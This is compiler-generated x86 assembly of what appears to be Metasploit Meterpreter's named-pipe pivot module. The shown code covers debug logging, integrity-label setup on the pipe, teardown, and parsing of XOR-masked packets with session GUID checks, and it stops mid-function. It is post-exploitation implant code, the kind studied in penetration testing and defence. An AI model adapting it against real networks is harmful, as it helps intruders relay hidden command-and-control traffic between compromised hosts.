	.file	"server_pivot_named_pipe.c"
	.text
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%esi
	pushl	%ebx
	subl	$1072, %esp
	movl	__imp__GetCurrentThreadId@0, %eax
	call	*%eax
	movl	%eax, 16(%esp)
	movl	$LC0, 12(%esp)
	movl	$1023, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___snprintf_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	call	_strlen
	movl	%eax, -12(%ebp)
	leal	12(%ebp), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %ecx
	movl	$1021, %eax
	subl	-12(%ebp), %eax
	movl	%eax, %edx
	movl	$1024, %eax
	subl	-12(%ebp), %eax
	leal	-1040(%ebp), %esi
	movl	-12(%ebp), %ebx
	addl	%esi, %ebx
	movl	%ecx, 16(%esp)
	movl	8(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%ebx, (%esp)
	call	_vsnprintf_s
	movl	$LC1, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__strcat_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__OutputDebugStringA@4, %eax
	call	*%eax
	subl	$4, %esp
	nop
	leal	-8(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%ebp
	ret
	.section .rdata,"dr"
LC2:
	.ascii "advapi32.dll\0"
LC3:
	.ascii "AddMandatoryAce\0"
	.align 4
LC4:
	.ascii "[NP-SERVER] AddMandatoryAce: %p\0"
	.text
	.def	_AddMandatoryAce@20;	.scl	3;	.type	32;	.endef
_AddMandatoryAce@20:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	_attempted.83832, %eax
	testl	%eax, %eax
	je	L3
	movl	$1, _attempted.83832
	movl	$LC2, (%esp)
	movl	__imp__LoadLibraryA@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L3
	movl	$LC3, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	%eax, _pAddMandatoryAce.83833
	movl	_pAddMandatoryAce.83833, %eax
	movl	%eax, 4(%esp)
	movl	$LC4, (%esp)
	call	_real_dprintf
L3:
	movl	_pAddMandatoryAce.83833, %eax
	testl	%eax, %eax
	je	L4
	movl	_pAddMandatoryAce.83833, %eax
	movl	24(%ebp), %edx
	movl	%edx, 16(%esp)
	movl	20(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	16(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	subl	$20, %esp
L4:
	movl	$1, %eax
	leave
	ret	$20
	.section .rdata,"dr"
	.align 4
LC5:
	.ascii "[PIVOT] Cleaning up the pipe pivot context\0"
	.align 4
LC6:
	.ascii "[PIVOT] Cleaned up the pipe pivot context\0"
	.text
	.def	_server_destroy;	.scl	3;	.type	32;	.endef
_server_destroy:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	12(%ebp), %eax
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L7
	movl	$LC5, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	364(%eax), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	-12(%ebp), %eax
	movl	368(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
	movl	36(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	-12(%ebp), %eax
	movl	65932(%eax), %eax
	testl	%eax, %eax
	je	L8
	movl	-12(%ebp), %eax
	movl	65932(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 65932(%eax)
L8:
	movl	-12(%ebp), %eax
	movl	65940(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_destroy
	movl	-12(%ebp), %eax
	movl	364(%eax), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	$LC6, (%esp)
	call	_real_dprintf
L7:
	movl	$0, %eax
	leave
	ret
	.def	_terminate_pipe;	.scl	3;	.type	32;	.endef
_terminate_pipe:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	cmpl	$0, 8(%ebp)
	je	L12
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	movl	$3, 4(%esp)
	movl	%eax, (%esp)
	call	_scheduler_signal_waitable
L12:
	nop
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC7:
	.ascii "[PIVOT] removing named pipe listener\0"
	.text
	.def	_remove_listener;	.scl	3;	.type	32;	.endef
_remove_listener:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	$LC7, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_terminate_pipe
	movl	$0, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC8:
	.ascii "[PIVOT] Allocating space: %u bytes\0"
	.align 4
LC9:
	.ascii "[PIVOT] Size not yet calculated\0"
	.align 4
LC10:
	.ascii "[PIVOT] header bytes received, calculating buffer offset\0"
	.align 4
LC11:
	.ascii "[PIVOT] Packet header before XOR: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]\0"
	.align 4
LC12:
	.ascii "[PIVOT] Packet header after XOR: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]\0"
	.align 4
LC13:
	.ascii "[PIVOT] Required size is %u bytes\0"
	.align 4
LC14:
	.ascii "[PIPE] Session not yet established, checking for response packet\0"
	.align 4
LC15:
	.ascii "[PIPE] Incoming packet is not encrypted!\0"
	.align 4
LC16:
	.ascii "[PIPE] Request ID found and matches expected value\0"
	.align 4
LC17:
	.ascii "[PIPE] Returned session guid: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\0"
	.align 4
LC18:
	.ascii "[PIPE]    Pivot session guid: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\0"
	.align 4
LC19:
	.ascii "[PIPE] Session pivot session guid size: %u\0"
	.align 4
LC20:
	.ascii "[PIPE] Session guid returned, looks like the session is a reconnect\0"
	.align 4
LC21:
	.ascii "[PIPE] We seem to have acquired a new instance of a pivot we didnt know was dead. Killing!\0"
	.align 4
LC22:
	.ascii "[PIPE] Session guid not found, looks like the session is new\0"
	.align 4
LC23:
	.ascii "[PIVOTTREE] Pivot sessions (after new one added)\0"
	.align 4
LC24:
	.ascii "[PIPE] Informing MSF of the new named pipe pivot\0"
	.align 4
LC25:
	.ascii "[PIVOT] Entire packet is ready, size is %u, offset is %u\0"
	.align 4
LC26:
	.ascii "[PIVOT] Extra %u bytes found, shuffling data\0"
LC27:
	.ascii "[PIVOT] Packet buffer reset\0"
	.text
	.def	_read_pipe_to_packet;	.scl	3;	.type	32;	.endef
_read_pipe_to_packet:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$332, %esp
	movl	$1, -28(%ebp)
	movl	8(%ebp), %eax
	movl	65920(%eax), %edx
	movl	8(%ebp), %eax
	movl	65924(%eax), %ecx
	movl	16(%ebp), %eax
	addl	%ecx, %eax
	cmpl	%eax, %edx
	jnb	L16
	movl	8(%ebp), %eax
	movl	65924(%eax), %edx
	movl	16(%ebp), %eax
	addl	%eax, %edx
	movl	8(%ebp), %eax
	movl	%edx, 65920(%eax)
	movl	8(%ebp), %eax
	movl	65920(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC8, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	65920(%eax), %edx
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_realloc
	movl	8(%ebp), %edx
	movl	%eax, 65916(%edx)
L16:
	movl	8(%ebp), %eax
	movl	65916(%eax), %edx
	movl	8(%ebp), %eax
	movl	65924(%eax), %eax
	addl	%eax, %edx
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
	movl	8(%ebp), %eax
	movl	65924(%eax), %edx
	movl	16(%ebp), %eax
	addl	%eax, %edx
	movl	8(%ebp), %eax
	movl	%edx, 65924(%eax)
	movl	8(%ebp), %eax
	movl	65928(%eax), %eax
	testl	%eax, %eax
	jne	L17
	movl	$LC9, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	65924(%eax), %eax
	cmpl	$31, %eax
	jbe	L17
	movl	$LC10, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	movl	%eax, -32(%ebp)
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	movl	%eax, -36(%ebp)
	movl	-36(%ebp), %eax
	addl	$31, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-36(%ebp), %eax
	addl	$30, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -92(%ebp)
	movl	-36(%ebp), %eax
	addl	$29, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -96(%ebp)
	movl	-36(%ebp), %eax
	addl	$28, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -100(%ebp)
	movl	-36(%ebp), %eax
	addl	$27, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -104(%ebp)
	movl	-36(%ebp), %eax
	addl	$26, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -108(%ebp)
	movl	-36(%ebp), %eax
	addl	$25, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -112(%ebp)
	movl	-36(%ebp), %eax
	addl	$24, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -116(%ebp)
	movl	-36(%ebp), %eax
	addl	$23, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -120(%ebp)
	movl	-36(%ebp), %eax
	addl	$22, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -124(%ebp)
	movl	-36(%ebp), %eax
	addl	$21, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -128(%ebp)
	movl	-36(%ebp), %eax
	addl	$20, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -132(%ebp)
	movl	-36(%ebp), %eax
	addl	$19, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -136(%ebp)
	movl	-36(%ebp), %eax
	addl	$18, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -140(%ebp)
	movl	-36(%ebp), %eax
	addl	$17, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -144(%ebp)
	movl	-36(%ebp), %eax
	addl	$16, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -148(%ebp)
	movl	-36(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -152(%ebp)
	movl	-36(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -156(%ebp)
	movl	-36(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -160(%ebp)
	movl	-36(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -164(%ebp)
	movl	-36(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -168(%ebp)
	movl	-36(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -172(%ebp)
	movl	-36(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -176(%ebp)
	movl	-36(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -180(%ebp)
	movl	-36(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -184(%ebp)
	movl	-36(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -188(%ebp)
	movl	-36(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-36(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-36(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-36(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-36(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -192(%ebp)
	movl	-36(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 128(%esp)
	movl	-92(%ebp), %edx
	movl	%edx, 124(%esp)
	movl	-96(%ebp), %edx
	movl	%edx, 120(%esp)
	movl	-100(%ebp), %edx
	movl	%edx, 116(%esp)
	movl	-104(%ebp), %edx
	movl	%edx, 112(%esp)
	movl	-108(%ebp), %edx
	movl	%edx, 108(%esp)
	movl	-112(%ebp), %edx
	movl	%edx, 104(%esp)
	movl	-116(%ebp), %edx
	movl	%edx, 100(%esp)
	movl	-120(%ebp), %edx
	movl	%edx, 96(%esp)
	movl	-124(%ebp), %edx
	movl	%edx, 92(%esp)
	movl	-128(%ebp), %edx
	movl	%edx, 88(%esp)
	movl	-132(%ebp), %edx
	movl	%edx, 84(%esp)
	movl	-136(%ebp), %edx
	movl	%edx, 80(%esp)
	movl	-140(%ebp), %edx
	movl	%edx, 76(%esp)
	movl	-144(%ebp), %edx
	movl	%edx, 72(%esp)
	movl	-148(%ebp), %edx
	movl	%edx, 68(%esp)
	movl	-152(%ebp), %edx
	movl	%edx, 64(%esp)
	movl	-156(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-160(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-164(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-168(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-172(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-176(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-180(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-184(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-188(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-192(%ebp), %esi
	movl	%esi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC11, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	leal	24(%eax), %edx
	movl	-32(%ebp), %eax
	movl	$4, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_xor_bytes
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	movl	%eax, -36(%ebp)
	movl	-36(%ebp), %eax
	addl	$31, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-36(%ebp), %eax
	addl	$30, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -92(%ebp)
	movl	-36(%ebp), %eax
	addl	$29, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -96(%ebp)
	movl	-36(%ebp), %eax
	addl	$28, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -100(%ebp)
	movl	-36(%ebp), %eax
	addl	$27, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -104(%ebp)
	movl	-36(%ebp), %eax
	addl	$26, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -108(%ebp)
	movl	-36(%ebp), %eax
	addl	$25, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -112(%ebp)
	movl	-36(%ebp), %eax
	addl	$24, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -116(%ebp)
	movl	-36(%ebp), %eax
	addl	$23, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -120(%ebp)
	movl	-36(%ebp), %eax
	addl	$22, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -124(%ebp)
	movl	-36(%ebp), %eax
	addl	$21, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -128(%ebp)
	movl	-36(%ebp), %eax
	addl	$20, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -132(%ebp)
	movl	-36(%ebp), %eax
	addl	$19, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -136(%ebp)
	movl	-36(%ebp), %eax
	addl	$18, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -140(%ebp)
	movl	-36(%ebp), %eax
	addl	$17, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -144(%ebp)
	movl	-36(%ebp), %eax
	addl	$16, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -148(%ebp)
	movl	-36(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -152(%ebp)
	movl	-36(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -156(%ebp)
	movl	-36(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -160(%ebp)
	movl	-36(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -164(%ebp)
	movl	-36(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -168(%ebp)
	movl	-36(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -172(%ebp)
	movl	-36(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -176(%ebp)
	movl	-36(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -180(%ebp)
	movl	-36(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -184(%ebp)
	movl	-36(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -188(%ebp)
	movl	-36(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-36(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-36(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-36(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-36(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -192(%ebp)
	movl	-36(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 128(%esp)
	movl	-92(%ebp), %edx
	movl	%edx, 124(%esp)
	movl	-96(%ebp), %edx
	movl	%edx, 120(%esp)
	movl	-100(%ebp), %edx
	movl	%edx, 116(%esp)
	movl	-104(%ebp), %edx
	movl	%edx, 112(%esp)
	movl	-108(%ebp), %edx
	movl	%edx, 108(%esp)
	movl	-112(%ebp), %edx
	movl	%edx, 104(%esp)
	movl	-116(%ebp), %edx
	movl	%edx, 100(%esp)
	movl	-120(%ebp), %edx
	movl	%edx, 96(%esp)
	movl	-124(%ebp), %edx
	movl	%edx, 92(%esp)
	movl	-128(%ebp), %edx
	movl	%edx, 88(%esp)
	movl	-132(%ebp), %edx
	movl	%edx, 84(%esp)
	movl	-136(%ebp), %edx
	movl	%edx, 80(%esp)
	movl	-140(%ebp), %edx
	movl	%edx, 76(%esp)
	movl	-144(%ebp), %edx
	movl	%edx, 72(%esp)
	movl	-148(%ebp), %edx
	movl	%edx, 68(%esp)
	movl	-152(%ebp), %edx
	movl	%edx, 64(%esp)
	movl	-156(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-160(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-164(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-168(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-172(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-176(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-180(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-184(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-188(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-192(%ebp), %ebx
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC12, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__ntohl@4, %eax
	call	*%eax
	subl	$4, %esp
	leal	24(%eax), %edx
	movl	8(%ebp), %eax
	movl	%edx, 65928(%eax)
	movl	-32(%ebp), %eax
	leal	24(%eax), %edx
	movl	-32(%ebp), %eax
	movl	$4, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_xor_bytes
	movl	8(%ebp), %eax
	movl	65928(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC13, (%esp)
	call	_real_dprintf
L17:
	movl	8(%ebp), %eax
	movl	65928(%eax), %eax
	testl	%eax, %eax
	je	L18
	movl	8(%ebp), %eax
	movl	65928(%eax), %edx
	movl	8(%ebp), %eax
	movl	65924(%eax), %eax
	cmpl	%eax, %edx
	ja	L18
	movl	8(%ebp), %eax
	movl	328(%eax), %eax
	testl	%eax, %eax
	jne	L19
	movl	$LC14, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	movl	%eax, -40(%ebp)
	movl	8(%ebp), %eax
	movl	65928(%eax), %eax
	leal	-4(%eax), %ecx
	movl	-40(%ebp), %eax
	leal	4(%eax), %edx
	movl	-40(%ebp), %eax
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_xor_bytes
	movl	-40(%ebp), %eax
	movl	20(%eax), %eax
	testl	%eax, %eax
	jne	L20
	movl	$LC15, (%esp)
	call	_real_dprintf
	movl	$52, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -44(%ebp)
	movl	-40(%ebp), %eax
	movl	24(%eax), %edx
	movl	-44(%ebp), %eax
	movl	%edx, 24(%eax)
	movl	-40(%ebp), %eax
	movl	28(%eax), %edx
	movl	-44(%ebp), %eax
	movl	%edx, 28(%eax)
	movl	-44(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__ntohl@4, %eax
	call	*%eax
	subl	$4, %esp
	leal	-8(%eax), %edx
	movl	-44(%ebp), %eax
	movl	%edx, 36(%eax)
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	leal	32(%eax), %edx
	movl	-44(%ebp), %eax
	movl	%edx, 32(%eax)
	movl	$65538, 4(%esp)
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_string
	movl	%eax, -48(%ebp)
	cmpl	$0, -48(%ebp)
	je	L21
	movl	8(%ebp), %eax
	leal	332(%eax), %edx
	movl	$32, 8(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcmp
	testl	%eax, %eax
	jne	L21
	movl	$LC16, (%esp)
	call	_real_dprintf
	movl	$0, -76(%ebp)
	leal	-76(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262606, 4(%esp)
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -52(%ebp)
	cmpl	$0, -52(%ebp)
	je	L22
	movl	-76(%ebp), %eax
	cmpl	$16, %eax
	jne	L22
	movl	8(%ebp), %eax
	leal	312(%eax), %edx
	movl	$16, 8(%esp)
	movl	-52(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcmp
	testl	%eax, %eax
	je	L22
	movl	-52(%ebp), %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-56(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -92(%ebp)
	movl	-56(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -96(%ebp)
	movl	-56(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -100(%ebp)
	movl	-56(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -104(%ebp)
	movl	-56(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -108(%ebp)
	movl	-56(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -112(%ebp)
	movl	-56(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -116(%ebp)
	movl	-56(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -120(%ebp)
	movl	-56(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -124(%ebp)
	movl	-56(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-56(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-56(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-56(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-56(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -128(%ebp)
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 64(%esp)
	movl	-92(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-96(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-100(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-104(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-108(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-112(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-116(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-120(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-124(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-128(%ebp), %edi
	movl	%edi, 8(%esp)
